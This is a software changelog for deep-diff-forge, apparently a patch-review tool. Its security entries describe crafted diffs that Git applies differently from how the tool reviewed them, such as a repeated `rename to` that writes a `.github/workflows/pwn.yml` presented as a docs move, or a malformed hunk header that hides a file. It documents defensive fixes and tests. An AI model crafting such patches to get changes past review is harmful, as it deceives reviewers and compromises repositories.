  `literal` or `delta` line, which Git refuses.
- **A move name with a carriage return in it is refused** (same rescore, F2, medium). Git reads
  an unquoted `rename to`/`copy to` name only up to a carriage return (or vertical tab or form
  feed), so `rename to build.rs\rdocs/notes.md` created `build.rs` while the review showed the
  whole line with a control-character hazard but no build-script signal. Git quotes such names,
  so an unquoted one is refused (exit 4).
- **A repeated mode header, or an `index` mode beside a mode header, is refused** (rescore N3,
  medium). Git keeps the last of each, and reads an `index` line's mode as the old mode, so
  `old mode 100755` / `new mode 100755` / `index … 100644` made a script executable while DDF,
  reading the first, showed no mode change. Git never writes either form.
- **What Git refuses as inconsistent is refused**: a section that is both a rename and a copy, a
  `+++` that differs from the `rename to` or `copy to` name, a new file's `+++` or a deleted
  file's `---` that differs from the `diff --git` name, and a second `---`/`+++` pair before a
  Git section's first hunk (rescore L2 and oracle mutants). Each was reviewed as a change that
  never applies.
- Test: `no_duplicated_or_copy_header_mutant_reads_differently_from_git`. The `git apply` oracle
  now compares `--summary` as well as `--numstat`: copies and the paths they write, created and
  deleted files, and mode changes. The test asserts the findings, then inserts each kind of
  extended header, a duplicate mode, an `index` mode, `copy to`, a nameless `---`/`+++` and a
  mismatched name at every position of five Git sections; each case must be refused or read
  exactly as Git reads it. Control: it fails on the v0.8.1 parser at N1.
- Test: `no_header_after_a_binary_line_or_control_in_a_move_name_is_read`, with binary lines and
  control-character move names added to the inserted headers. Control: both tests fail on
  `af5c3d1`. The refusal message for contradictory headers now names repeated modes and
  rename-and-copy, not only a new or deleted file.

## [0.8.1] - 2026-11-07

Tagged `v0.8.1` at `d290379` (2026-11-08), signed.

**Security release.** v0.8.0 reviewed a rename to a different destination than `git apply`
writes when a line Git does not read as a header (a blank line, any text) came between two
`rename to` lines (independent rescore of v0.8.0, F1, high). Upgrade from 0.8.0; every change
below is a fix or an addition, and no interface changes.

### Added

- **Every council result names its schema** (low-severity finding of the 2026-11-04
  assessment). `council review`, `status`, `gate` and `import` printed JSON with no `schema`
  field, so a consumer could not tell a changed shape from a broken one. They now carry
  `deep-diff-forge.council-<command>.v1`; `gate` stays an array and each result in it carries
  the field. The field is added, nothing is removed or renamed. `prepare`, `export-tuicr` and
  `import-tuicr` already named theirs and are unchanged. Test:
  `every_council_result_names_its_schema` (fails on the old CLI: `review` had no schema).
### Fixed

- **A signal stops the daemon even when its socket path is gone, and a second signal ends the
  drain** (low-severity findings of the 2026-11-04 assessment). A stop woke the accept loop by
  connecting to the socket path, so once the path was removed the daemon waited for a client
  that could no longer arrive. The loop now polls the listener together with a private socket
  pair that a stop writes to; the listener is non-blocking, and an accepted socket is made
  blocking again (macOS passes the mode on). A second SIGTERM or SIGINT during the drain was
  ignored; it now exits at once with 128 plus the signal's number, after removing the socket
  if it is still this daemon's. Tests: `a_signal_stops_the_daemon_after_its_socket_path_is_gone`
  and `a_second_signal_during_the_drain_exits_at_once`; both fail on the old daemon (measured).
  `an_idle_daemon_uses_no_cpu` keeps the loop waiting in `poll`: without the wait it spins on
  the non-blocking listener (1.86 s of CPU in 2 s idle).
### Security

- **A rename's reviewed destination is the one Git writes** (independent rescore of v0.8.0,
  F1, high). Git ends a `diff --git` section's extended header at the first line it does not
  read as one (a blank line, any text) and at a last line with no line feed; DDF read on. So
  `rename to .github/workflows/pwn.yml`, a note, then `rename to docs/harmless.md` was reviewed
  as a harmless docs move (exit 0, through the CLI, `rpc` and MCP) while `git apply` installed
  the workflow. Measured on v0.8.0 with Git 2.56. After the header ends, a header line or a
  `---` is now refused (exit 4), and so is a header line with no line feed.
- **A Git section's `---`/`+++` after its header ended is refused** (rescore F2). Git reads that
  pair as a new, traditional patch: `--- a/too<TAB>.py` after a blank line made Git modify `too`
  while DDF reviewed a rename of `tool.py`.
- **`+++ /dev/null` in a Git section needs `deleted file mode`** (rescore F3), and `--- /dev/null`
  needs `new file mode`. Without it Git deleted the old file and also created one named
  `dev/null`, which the review did not show. The rendering of a traditional diff's added or
  deleted file now carries the mode line Git implies (`100644`), so it still reparses.
- **A traditional new or deleted file must only add or only remove lines**, as with a mode line.
  Git refuses one that does not ("new file depends on old contents", "deleted file still has
  contents"); DDF accepted it. Found by fuzzing this branch; the input is a regression fixture.
- Test: `no_extended_header_mutant_reads_differently_from_git` asserts the findings against
  `git apply --numstat`, then breaks every extended-header position of four Git sections with a
  blank line, a note or `---`, followed by each kind of late header; each case must be refused
  or read exactly as Git reads it. Control: it fails on the v0.8.0 parser at F1.
- **A release is built only from a tag on `main`** (low-severity finding of the 2026-11-04
  assessment). The release workflow already refused a tag not signed by an allowed key; a
  correctly signed tag on a commit that never reached `main` was still released. The
  supply-chain gate now passes `main`'s commit to `scripts/verify_release_tag.sh`, which refuses
  a tag whose commit is not an ancestor of it, and checks out full history for that. Measured:
  the old script verified such a tag (`repo_scripts.rs` control). A branch that also edits
  `release.yml` can still drop the check; `RELEASE_AND_PUBLICATION.md` says so.

## [0.8.0] - 2026-11-06

Tagged `v0.8.0` at `dd1aa89` (2026-11-07 local time; 2026-11-06 UTC), signed.

**Breaking.** 0.8.0 is a minor release because it changes contracts 0.7.0 callers rely on:
`PatchParseError` gains four variants (`MisplacedHunk`, `LossyHeader`, `HunkWithoutChange`,
`SectionWithoutPatch`) and is now `#[non_exhaustive]`; patches Git refuses or reads differently
are refused (exit 4) instead of reviewed; and non-UTF-8 input exits 3 where some commands
exited 4. Each is listed below.

### Security

- **A client that reads slowly can no longer hold the daemon's read budget** (production
  readiness 2026-11-04). A request's bytes stayed reserved until its answer was written, and
  `SO_SNDTIMEO` bounded each write call, not the response, so two clients that read a byte every
  29 s held the whole 160 MiB budget and every other request was refused busy. The bytes now go
  back once the answer is ready, and each response must be read within 30 s of its first byte
  (`write_line_within`; every response and refusal is written through it). The write is
  non-blocking: the deadline is checked before every write call, and each wait for space is a
  `poll` bounded by the time left. A blocking write cannot give that bound, because
  `SO_SNDTIMEO` restarts for each buffer the call waits for (measured):
  - one 2 MB write to a client reading 128 KiB every 300 ms ran seconds past an 800 ms limit on
    Linux;
  - 64 KiB writes with the timeout re-armed between them still did on macOS (PR #101 CI), whose
    Unix socket send buffers default to 8 KB.

  The tests' controls catch the single write, the 64 KiB writes (a 4 KB send buffer models
  macOS: 1.50 s past a 500 ms limit) and the budget held through the write.
- **Every child process DDF waits for has a deadline and capped output.** `tuicr` (120 s, 32 MiB)
  and the council's Git calls (120 s, the caller's cap) waited without either. Both now run
  through `deep_diff_forge_core::process::run_bounded`, which kills and reaps a child past its
  limits without waiting on a grandchild that holds its pipes. `clippy.toml` disallows the
  unbounded waits (`Command::output`, `Command::status`, `Child::wait`,
  `Child::wait_with_output`) outside a reviewed door.

### Added

- **`findings verify --require-findings`** refuses (exit 7) a findings file that holds no
  findings. `--require-all` holds for an empty file, so a gate on it passed an agent that wrote
  nothing; a gate that needs findings adds both. `Verdict::total` counts them.

### Changed

- **Release binaries are built from one codegen unit** (`[profile.release] codegen-units = 1`).
  With the default 16, a binary built from this release's daemon and process changes, which
  touch no parser code, parsed 27% slower than `main`'s (`parse_seal`, 1.27x in CI and locally;
  identical binaries measured 1.00x). Built with one unit each, the two were within 1.01x
  (measured). `release_binaries_are_built_from_one_codegen_unit` keeps the setting.

- **Non-UTF-8 input exits 3 (`io`) everywhere**, as the exit-code registry names it: a findings
  file and an `eval` corpus file name or findings file exited 4, and an `analyze` source exited
  4 while its patch exited 3.
- **`review.change` checks its deadline between its two Git stages**, so a request overruns its
  client's deadline by one stage at most, as documented (C9), not two.
- **A malformed hunk header can no longer hide a file from the review** (production readiness
  2026-11-04). The parser trimmed the space after `@@`, so `@@-1,1 +1,1 @@` was read as a hunk of
  the current file and the `--- a/evil` / `+++ b/evil` lines after it as that hunk's body, while
  `git apply` ended the file there and wrote `evil`. Measured on v0.7.0: DDF reviewed one file,
  exit 0; `git apply` changed two. Hunk headers now follow Git's `parse_fragment_header` byte for
  byte (`@@ -` RANGE ` +` RANGE ` @@`), and any line beginning `@@` that is not one is refused.
- **A hunk is accepted only where Git reads one** (`MisplacedHunk`): right after its file's `+++`
  or a Git section's extended header, or right after the previous hunk. A hunk after a blank or
  stray line is "patch fragment without header" to Git.
- **A header line that is not UTF-8 is refused** (`LossyHeader`, exit 3), instead of being
  reviewed under a substituted name (`caf\xe9` and `caf\xe8` both read `caf\u{fffd}`). Lossy
  hunk lines and preamble are still reviewed and marked, as before.

- **Patches Git refuses or reads no patch from are refused:** a hunk that adds and removes
  nothing (`HunkWithoutChange`: Git's "corrupt patch"; it was exit 7 under `--require-hunks`, exit
  0 without), a `diff --git` line with nothing after it, and a traditional `---`/`+++` pair with
  no hunk (`SectionWithoutPatch`). Exit 4.
- **`PatchParseError` is `#[non_exhaustive]`**, so a future refusal is a new variant without
  breaking callers that match it; outside the patch crate, match with a wildcard arm or use
  `exit_code`.
- **One place decides a parse refusal's exit code** (`PatchParseError::exit_code`): the CLI, the
  structured Git selections and the daemon's domain code use it, and the Rust SDK maps daemon
  error 3 to exit 3, as the registry names it.

### Testing

- **Differential Git oracle** (`crates/deep-diff-forge-patch/tests/git_differential.rs`): for every
  patch DDF accepts, `git apply --numstat -z` must name the same files with the same added and
  deleted counts. It runs over every patch fixture and fuzz regression, and over every
  one-character edit of a hunk header placed in front of a hidden file. All six of its tests fail
  on v0.7.0's parser, each for the reason it names (control, measured).
- **The `patch_parser` fuzz target reads raw bytes** through the lossy decoder (it skipped non-UTF-8
  input), checks that no accepted hunk is change-free, and is seeded with every committed patch,
  regressions included.

- **Tests clean up after themselves** (DDF-TEST-TMPLEAK-001). About 100 test sites built
  `temp_dir()/ddf-<name>-<pid>` by hand, and many never removed it: one full `cargo test
  --workspace` left 51 files and directories in the temp dir (measured). Every test now takes a
  `deep_diff_forge_testkit::Scratch`, a fresh 0700 directory that is removed when it drops, pass
  or panic. The new crate `deep-diff-forge-testkit` is test-only and never published (path-only
  dev-dependency; `deny.toml` `allow-wildcard-paths`). `clippy.toml` disallows
  `std::env::temp_dir`, and `only_the_testkit_names_the_temp_dir` scans every Rust file for it,
  since integration tests opt out of `disallowed_methods` file by file.

### Fixed

- **A daemon at its connection limit is no longer reported absent on macOS.** The daemon accepts
  and closes a connection over its limit; macOS can report that as `ENOTCONN` from the client's
  peer-credential check, which the CLI read as "no daemon at" (exit 6, wrong message) instead
  of "no answer … (it may be at its connection limit; retry)". Seen on PR #100's macOS run.

- **Two daemon tests no longer race the server on macOS** (DDF-TEST-MACTIMEOUT-001, #97).
  `a_connection_answers_and_ends_within_a_deadline` and `a_control_connection_answers_one_small_request`
  armed the client's read timeout after the connection thread could answer and close, and macOS
  refuses `SO_RCVTIMEO` on a socket whose peer has closed (`EINVAL`). It failed attempt 1 of the
  v0.7.0 release run. Both now arm it before the thread starts. A test race; the product already
  treats that `EINVAL` as settled.
- **Three daemon paging tests are bounded** (DDF-TEST-PAGEBOUND-001). `outline_pages_cover_every_hunk_once`,
  `outline_cursors_at_a_file_without_hunks_resume` and `pages_of_escaped_text_fit_their_budget_as_emitted`
  paged until `next_cursor` was null, so a pager that never ends spun the test instead of failing it
  (a mutation run left two such binaries spinning). Each now takes at most 10,000 pages and then
  asserts paging ended. Control: with `next_cursor` falling back to the request cursor, the old
  tests ran to the 120 s mutation timeout; the new ones fail in 40 s.

## [0.7.0] - 2026-11-03

PRs #95 and #96 merged before the tag, so their entries below ship in v0.7.0 (`3823fcf`).

### Security

- **Release archives are reproducible** (expert circle 2026-11-03, C14). `scripts/package_release.py`
  replaces `tar czf`: sorted entries, the commit time as every mtime, uid/gid 0, fixed modes, USTAR,
  and a gzip header with no name or time. The same inputs give the same bytes; a control test
  shows `tar czf` does not. The macOS runner image was pinned to `macos-26` before the tag (see Changed).
- **The release workflow refuses a tag that is not signed by an allowed key** (expert circle
  2026-11-03, C4). The supply-chain gate verifies the pushed tag against `main`'s
  `.github/allowed_signers` before any build, so a tag pushed without `just release-tag`, or
  from a commit that lists its own key, publishes nothing. A dry run checks the newest `v*` tag.
- **SBOM checksums identify the package source** (C6). Each registry package now carries the
  SHA-256 of its `.crate` archive, as recorded in `Cargo.lock`, not a hash of its `Cargo.toml`.
  Workspace members carry none.
- **Release tags are signed.** `just release-tag` now signs the tag with SSH through
  `scripts/sign_release_tag.sh` and deletes it, before pushing, unless it verifies against
  the new `.github/allowed_signers`. v0.6.0 is the first signed tag. Tests run the script
  with a trusted key, an untrusted key and no signers file.

### Changed

- **The macOS runners are pinned to `macos-26`** (it was `macos-latest`, which named
  `macos-26-arm64` on 2026-11-03). A test in `release_workflow.rs` fails if any workflow
  uses a `-latest` runner label, so a GitHub repoint can no longer move a build or the
  required `macOS tests` check to a new major image unannounced. The job names, and so the
  required checks, are unchanged.
- **"Not a regular file" exits 4 in every command** (expert circle C16). `structural`,
  `semantic` and the other syntax commands, `analyze`, and `--findings` exited 3 for a FIFO,
  directory, device or socket. `<old> <new>` and `eval` already exited 4. A path that cannot be
  read at all (missing, no permission) still exits 3.
- **The same input can now report `renamed` where it reported `modified`** (DDF-HUNT-PATCH-6).
  This affects a Git section whose `---`/`+++` names differ, with no rename header: two-file
  review (`deep-diff-forge <old> <new>`), and `--stdin-patch`, `diff.compute` or MCP input of that
  shape. A consumer filtering on `status == "modified"` for such input now sees `renamed`. The
  status names did not change, so the schemas stay `v0`. The `v0` compatibility rule is now
  written down in `docs/API_AND_IPC.md` (Protocol Versioning).
- **New `old_path` member** in `review.v0` files and `diff.file` JSONL events, for a `renamed` or
  `copied` file, plus `(from <old>)` in the text summary. The hazards of the old path count in
  `hazards`, so renaming `.github/workflows/x` away is flagged.

### Fixed

- **`just release-tag` no longer fails its own gate under a signing configuration.** The
  repository-script tests kept out the global and system Git files but inherited
  configuration passed in the environment (`GIT_CONFIG_COUNT`, and `GIT_CONFIG_PARAMETERS`
  from `git -c`). With `tag.gpgSign=true` there, as `release-tag` is run, a lightweight test
  tag became an annotated one that asked for an editor, and the release gate failed before
  signing (found on the first `release-tag 0.7.0`; no tag was made). The tests' command
  runner now removes both unless a test sets its own. Measured: the workspace suite passes
  under the exact release-tag environment, and the old runner failed it.
- **A client whose request the daemon refuses early still gets the refusal.** Under the new read
  budget the daemon answers an over-budget line and closes before the rest is sent, which broke the
  client's write. `request` reported the broken pipe instead of the answer waiting for it. It now
  reads the answer first (found by the release dry run on Linux arm64).
- **The daemon caps the request bytes it reads across connections** (expert circle C3). Each data
  connection reserves its line's bytes, as they arrive, against one 160 MiB budget
  (`MAX_READ_BYTES`), and holds them until its answer is written. Before, each of the eight
  connections could buffer an 80 MiB line, and its parsed copy, outside the in-flight budget:
  about 1.25 GiB at worst. A line over the budget is answered `RESOURCE_EXHAUSTED` and its
  connection closed. Control connections are not counted.
- **Daemon work stops at its client's read deadline** (C9). A socket request runs under its
  client's 30 s deadline. It is checked before the work starts and after each heavy stage (the
  parse, a Git acquisition, a session snapshot); past it, the request ends `RESOURCE_EXHAUSTED`
  and releases its worker and admission weight. Before, the work went on for an answer nobody
  would read. The stdio `rpc` and MCP servers have no such deadline.

- **A move header with no partner is refused, as Git refuses it** (expert circle 2026-11-03).
  `copy from x`, `copy to y`, `rename from x` or `rename to y` alone, with no `---`/`+++` to name
  the other side, was reviewed as a copy or rename. `git apply` refuses each ("git diff header
  lacks filename information"). Where `---`/`+++` does name the other side, DDF now records it as
  the header Git reads. Before, `rename to y` beside `--- a/x` rendered as a move from `y`.
- **A mode that Git reads as unchanged is no mode change** (expert circle 2026-11-03). Git
  canonicalises modes (`canon_mode`): only the owner's execute bit counts for a regular file. So
  `100644 -> 100664`, and a lone `old mode` or `new mode`, change nothing. A section whose only
  content is such a header is refused, as `git apply` refuses it ("patch with only garbage");
  it was reviewed as a mode or type change.
- **A fatal accept error no longer strands the daemon's socket** (expert circle C8, 2026-11-03).
  A persistent accept failure, such as EMFILE when the process runs out of descriptors, returned
  at once. That skipped the socket cleanup and cut off the answers in progress. It now ends the
  loop as a shutdown does: the socket is removed, the answers drain, and then the error is
  returned. A setup failure after binding (the signal watcher) removes the socket too. A client
  that gave up while queued (ECONNABORTED) no longer stops the daemon.
- **`eval` holds the corpus to byte limits** (expert circle C5). The manifest and each case
  file are limited to 8 MiB, and the case files together to 64 MiB. Each limit is checked
  before a file is read whole, and going over it is exit 4. Before, `read_to_end` had no limit.
- **The soak receipt records the daemon's counters** (expert circle C10). `daemon metrics` is
  read at the start and at the end of the weekly soak and kept in the receipt's `metrics`, so the
  history that OPERATIONS_AND_DAEMON points to exists. The soak fails when the final read fails.
- **A Git section naming two different files is reviewed as the rename `git apply` makes**
  (DDF-HUNT-PATCH-6). `diff --git a/x b/y` with `--- a/x`/`+++ b/y` and no rename header was
  reviewed as `modified y`, but `git apply` deletes `x` and creates `y`. The review now says
  `renamed` and keeps `x` as the old path. Two-file review (`deep-diff-forge <old> <new>`, which
  reads `git diff --no-index` output) therefore reports `renamed`. A Git oracle test applies the
  original and the rendered patch and compares the trees.
- **A doubled slash in a `diff --git` name no longer breaks render stability** (DDF-FUZZ-PATCH-8,
  found by the scheduled fuzz campaign of 2026-11-02 on the v0.6.0 commit). A quoted half lost a
  `/` that an unquoted half kept. The crash input is kept in `fixtures/patch/regressions/`.
- **A FIFO given as an input file no longer hangs the CLI** (DDF-HUNT-CLI-8). `findings verify
  --findings FIFO` and `review --findings FIFO` waited for ever for a writer, and so did `eval`
  when the corpus's `MANIFEST.json` was a FIFO, because it is read before the corpus walk checks
  file types. Every user-named input file is now opened through one helper (`regular.rs`): it
  opens with `O_NONBLOCK`, checks the type of the open descriptor, and refuses anything but a
  regular file (exit 3; exit 4 for the eval corpus). The syntax commands and analysis already did
  this, and now share the helper. Tests run each command against a FIFO under a 10-second
  deadline; on the old code they time out.
- **The daemon can be stopped and checked at its connection limit** (DDF-HUNT-DAEMON-7). Two
  control slots beyond the eight data slots answer `daemon.health`, `daemon.status`,
  `daemon.metrics` and `daemon.shutdown`. Each holds one small request, read within 5 s. Before,
  eight idle clients kept `daemon stop` out and only a signal stopped the daemon.
- **On macOS, a daemon at its connection limit is no longer reported as absent.** macOS refuses to
  set a write timeout on a connection the daemon has already closed, and the CLI read that
  `EINVAL` as "no daemon at". It now reports "no answer", with exit 6 (found by macOS CI on this
  change).
- **SIGTERM and SIGINT stop the daemon cleanly**: they now drain the answers in progress, remove
  the socket and exit 0, as `daemon stop` does. That covers `launchctl bootout`, `systemctl stop`,
  `kill` and Ctrl-C. Before, the signal killed the daemon and left its socket file behind.

## [0.6.0] - 2026-11-02

### Dependencies

- **Dependabot's first version updates, applied together** (#63 to #70): serde 1.0.229,
  serde_json 1.0.154, rustix 1.1.5, unicode-width 0.2.2, tree-sitter 0.26.13,
  `actions/attest-build-provenance` and `github/codeql-action` 4.39.1 (SHA-pinned). The
  individual pull requests each failed the SBOM gate (a dependency bump moves the committed
  SBOM) and the workspace bumps also left `fuzz/Cargo.lock` stale; this change regenerates both,
  with the fuzz lock moved only as far as the bumps require (its `syn` follows the workspace's
  3.0.4). tree-sitter 0.26 changed the parse progress callback to return `ControlFlow`: the
  deadline cancel now returns `Break` where it returned `true`.
- **Dependabot groups each ecosystem's updates into one pull request** (`cargo`, `fuzz`,
  `actions`), so the SBOM and fuzz lock are regenerated once per group.

### Added

- **An exact platform matrix.** The supported platforms are four release targets, listed in
  README.md#supported-platforms, SECURITY.md and RELEASE_AND_PUBLICATION.md, and
  `cli/tests/crate_edges.rs` fails when the release matrix or those docs name another set of
  target triples, when a doc omits the glibc floor, or when a doc mentions musl without stating
  it as unsupported:
  - **`aarch64-unknown-linux-gnu` is a release target**, built and run natively on GitHub's
    `ubuntu-22.04-arm` runner like the others (smoke, checksum, provenance). Not
    `ubuntu-24.04-arm`: built there, the binary had a hard need of `GLIBC_2.39`, over the floor
    (measured by the first CI run of the floor check). A `Linux arm64
    tests` job runs the whole suite there on every event: not a required check on pull requests,
    but it gates every release build through release.yml's `quality`, as `macOS tests` does.
    Both passed on their first pull-request run (#79, 2026-11-01) and on every pull request
    since.
  - **A declared and enforced glibc floor: 2.34.** `scripts/check_glibc_floor.sh` fails the
    release smoke when a Linux binary needs a newer `GLIBC_` symbol version; a Linux-only test in
    `crate_edges.rs` runs it on the built binary (passes) and with a lowered floor (refused). Measured: the
    v0.5.0 x86_64 binary needs at most `GLIBC_2.34`, ran on glibc 2.34, 2.35 and 2.36, and was
    refused by the loader on 2.31. On glibc 2.34 to 2.38 the loader prints one stderr warning
    per run (``weak version `GLIBC_2.39' not found``, from optional symbols in Rust's standard
    library); output and exit codes are unchanged.
  - **musl is stated as unsupported** (not built or tested), as are Windows, other
    architectures and the BSDs. The macOS minimums (11.0 arm64, 10.12 x86_64) are the ones the
    binaries declare, not run.
- **The launchd agent is loaded by a real launchd in CI.** The `macOS launchd agent` job runs
  `scripts/launchd_smoke.sh`: the plist, pointed at the built binary, is bootstrapped into
  `gui/<uid>` (or `user/<uid>`), answers `daemon health` with launchd's pid, is restarted after
  SIGKILL, stays stopped after `daemon stop` with its socket gone, and is unloaded by `launchctl
  bootout`; every wait is bounded. Not a required check, and skipped in release runs (release.yml
  calls ci.yml with the new `release: true` input) so its unproven timed waits cannot block a
  release build; its first run on a hosted Mac is pending CI (the flow was checked only against a
  fake `launchctl` on Linux).
- **Daemon metrics for Prometheus, without a listener.** `daemon metrics --format prometheus`
  prints the `daemon.metrics` answer in the Prometheus text format 0.0.4 (`ddf_daemon_*` names,
  `_total` counters, seconds and bytes in the names, escaped labels, a latency histogram with
  cumulative `le` buckets and no `_sum`, which the daemon does not keep), and `--out PATH` writes
  it whole for node_exporter's textfile collector: a temporary file in the same directory, then a
  rename; a symlink or non-regular file at PATH is refused (exit 3); mode `0644`, also under
  umask 077. A temporary left by a killed run is skipped (the next of 8 names), not reused. A daemon with no
  usable metrics exits 6 and leaves the file as it was. The JSON answer (`--format json`, the
  default) and the RPC are unchanged; both renderings read the same document
  (`deep_diff_forge_daemon::exposition`), and a strict reader in its tests checks the format's
  rules. `contrib/systemd/deep-diff-forge-metrics.{service,timer}` write it every 15 s. Not run
  against a real node_exporter or promtool (neither is installed here).
- **`deep-diff-forge [--] <old> <new>` reviews two regular files.** `patch::diff_files` runs
  `git diff --no-index` with the acquisition's hardening, from `/` on the canonical paths, with
  `core.attributesFile=/dev/null`, `GIT_ATTR_NOSYSTEM=1` and `core.autocrlf=false`; the CLI seals
  Git's exact bytes and prints every `--stdin-patch` mode (`--json`, `--jsonl`, `--rank`,
  `--cluster`, `--outline`, `--hunks`, `--layout`, the input guards). Refused, by name: a
  missing path (exit 3), a path that is itself a symbolic link, a directory or special file
  (exit 4; a linked parent directory resolves), two sizes over the 64 MiB budget, checked before
  Git reads them (exit 4). Git's answer must be one of its two shapes for a readable pair (exit 0
  with no patch, exit 1 with one) with nothing on stderr; otherwise exit 3. Without that check a
  side removed after DDF's checks (Git: exit 1, empty stdout, `Could not access`) was reviewed as
  "0 files changed" with exit 0 (review finding, reproduced with real Git and a stub). A first word that is neither a command
  nor a file stays `unknown command` (exit 2); `--` marks it as a path. Directories are out of
  scope. Measured while building it: run inside a repository, `git diff --no-index` ran that
  repository's own clean filter, and the user's `core.autocrlf` changed the compared bytes;
  `cli/tests/file_pair.rs` fails if either comes back. New errors `GitAcquireError::FileUnreadable`
  and `FileRefused` (a breaking change for an exhaustive `match` on `GitAcquireError`); the
  exit-4 registry meaning now names a refused file pair.

### Changed

- **`chain`, `cluster` and `loom` are withdrawn, not planned.** `--help` listed them, with
  `<old> <new>`, as "NOT YET IMPLEMENTED" and nobody owned them. Each is now refused with exit 2
  and its replacement, even with a second word that would otherwise be a path pair, and
  `--help` lists them under "WITHDRAWN". `chain-contract` and `cluster-contract` list only
  shipped modes (a test runs each one); `cluster-contract` names the two dimensions that run
  (patch, risk) and no longer claims per-lane budgets; `loom-contract` records the withdrawal.

- **Dependabot watches the Python client.** `.github/dependabot.yml` gains a weekly `pip` entry
  for `sdk/python` (its only requirement is the setuptools build backend), with the same 7-day
  cooldown as the Cargo and Actions entries.
- **Whole-crate mutation of `core`, `patch`, `daemon` and `syntax`** (EVIDENCE.md, 2026-11-01).
  51 tests pin the mutants each crate's own tests missed: hunk addresses and digests, Git
  C-quoted paths, the raw-record and patch-block identity checks, the exact `review.v0`
  document, rename and truncation refusals in the parser, a socket line that ends at its
  newline, and the byte, node and cell budgets of the syntax crate at exactly their limit.
  Missed by the crate's own tests: `core` 22 to 3, `patch` 82 to 3, `syntax` 29 to 3, each
  remaining one equivalent or compiled only off Unix. `daemon` (16 missed, 13 timeouts) was
  re-run in workspace scope only, not whole: the workspace's tests catch all but 3 equivalents
  (2 of them caught only by `graph`'s timing test on a loaded machine) and one loop mutant that
  still times out. Tests of edit-script loops, tree walks and
  quoted-path decoding run under a 10 s deadline, so a loop that stops advancing fails its test
  instead of hanging the suite. Test code only.

- **The Python client is a package.** `sdk/python/pyproject.toml` (setuptools, no dependencies,
  Python 3.9+) installs `deep_diff_forge` as the package `deep-diff-forge`, from a checkout
  (`python3 -m pip install ./sdk/python`) or from GitHub with `#subdirectory=sdk/python`. It is
  not on PyPI. `deep_diff_forge.__version__` exists, and `cli/tests/python_sdk.rs` keeps both
  version strings equal to the workspace version.
- **The daemon drains on stop.** After `daemon.shutdown` the socket is removed and the listener
  closed (queued connections are refused at once), and the requests in progress, counted from
  their first byte until their response is flushed, are answered before the process exits, for
  up to 30 s. Idle connections are not waited for. A request read
  after the stop is refused with `RESOURCE_EXHAUSTED` (8), "the daemon is shutting down".
  Before, the process exited as soon as the accept loop returned, cutting off answers in
  progress. The log records `shutdown_drained` (level `info`) or `shutdown_drain_timeout`
  (`warn`).
- **`daemon stop` returns once the daemon has exited**, waiting up to 35 s for its start lock
  (`SocketLocation::stop_waiter`, opened before the stop so a symlinked socket path finds the
  real lock; `STOP_WAIT`), and exits 6 if it has not. Before, it returned
  while the daemon was still exiting, so a `daemon start` right after it could find the old
  daemon in the way.
- **Service units:** `contrib/systemd/deep-diff-forge.service` (systemd user unit) and
  `contrib/launchd/dev.deep-diff-forge.daemon.plist` (launchd agent, which sets
  `XDG_RUNTIME_DIR`, absent on macOS). `cli/tests/service_units.rs` keeps them consistent with the
  CLI. The systemd `ExecStop` ignores "no daemon" (`-`): systemd also runs it after a daemon
  stopped from a shell, and its exit 6 restarted the unit (measured: `NRestarts=1` without the
  `-`, 0 with it).
- **The live review loop is tested.** `deep-diff-forge-tui`'s `run` takes the terminal through one
  seam: stdout and crossterm's raw-mode, `read` and `poll` functions, passed in as values, so
  production has no adapter code of its own. Tests drive that same loop and restore with scripted
  input against a `TestBackend`: the frame drawn is the headless render, a queued burst is
  applied before one redraw, nothing queued after `q` is read, a resize redraws at the new size,
  and an ending or failing input, a failing draw, a panic or a failed restore each return their
  error (or unwind) with raw mode off and the alternate screen left. `cli/tests/review_tty.rs`
  runs bare `review` in a pseudo-terminal (Python's `pty`): the alternate screen and mouse
  capture are entered, the cockpit is drawn, `q` exits 0, and both are restored.


- **The evaluation corpus has 34 cases, and declared misses count.** `fixtures/eval` grew from
  11 to 34 cases (14 ranking, 17 evidence, 3 findings), each with a classified origin: a CVE,
  GHSA or RUSTSEC shape (CVE-2021-42574, CVE-2023-49291, CVE-2024-32002, GHSA-pjwm-rvh2-c87w,
  RUSTSEC-2022-0042), a real-world shape, one of this project's findings, or `synthetic:` with
  its reason. Three are hard negatives, where a risky-looking file must not outrank.
  - A declared miss now counts as wrong in its metric; before, the one known miss was left out
    of recall. A ranking pair can be declared (`known_miss`), and so can an evidence false
    positive (`known_false_positive`). The receipt lists them in a new `declared` field, and the
    summary prints each as `KNOWN …` under a `declared` count (it printed `known misses`).
    `known_misses` keeps its meaning, the evidence `known_miss` items (7); `declared` lists
    every kind (11). A declared miss the engine gets right fails the run.
  - The engine was not changed. It gets 11 cases' labels wrong, all declared: ranking 12/15,
    evidence precision 21/22, recall 21/28, findings 33/33 (measured). `cli/tests/eval.rs`
    holds those values as its floors, which were 100% over a smaller corpus.
  - The manifest is refused (exit 4) when a file of the corpus is named by no case, or a case
    has no origin, the id of another case, or a field its kind does not read, when a ranking
    pair is not exactly two distinct paths (`[p, p]` can never hold, so as a `known_miss` it
    could never go stale; before, it was a wrong label, exit 7), and when the corpus holds a
    symlink (it could lead out of the corpus). A case can name only a file of the corpus
    directory (exit 3 otherwise).

### Fixed

- **The arm64 Linux release build smokes its binary** (2026-11-02). The smoke step read the
  workspace version with Python's `tomllib`, which the `ubuntu-22.04-arm` runner's Python 3.10
  lacks, so the first release dry run with the arm64 target (run 41386917463 on `aac52a6`) failed
  before the smoke ran; the other three targets passed. `ci.yml` had the same defect, fixed in
  #82 (DDF-CI-ARM-001), but `release.yml` kept it. The step now reads the version as
  `just release-tag` does (`sed`), and `cli/tests/release_workflow.rs` refuses a matrix job that
  imports `tomllib` without `actions/setup-python`.
- **`pip install ./sdk/python` installs the current client** (2026-11-02). The repository
  tracked setuptools output (`sdk/python/build/lib/deep_diff_forge.py` and
  `deep_diff_forge.egg-info/`). setuptools reuses an existing `build/lib`, so an install from a
  checkout of `main` installed that copy: the client from before the bug-hunt fixes (no write
  timeout, weaker response validation), measured in a clean venv. The output is untracked and
  ignored (`/sdk/python/build/`, `/sdk/python/dist/`, `*.egg-info/`), and
  `cli/tests/python_sdk.rs` fails if `.gitignore` stops ignoring it. The `pyproject.toml` install
  comment names `@v0.6.0`, the first tag with package metadata. Found by the independent
  rescore of 2026-11-02.
- **A failed alternate-screen entry no longer leaves the terminal in raw mode.** `review` switched
  raw mode on, then wrote the alternate-screen sequence, and armed its restore guard only after
  that write; if the write failed (stdout closed) it returned with the terminal still raw. The
  guard is now armed as soon as raw mode is on. If raw mode cannot be switched on, nothing is
  written.
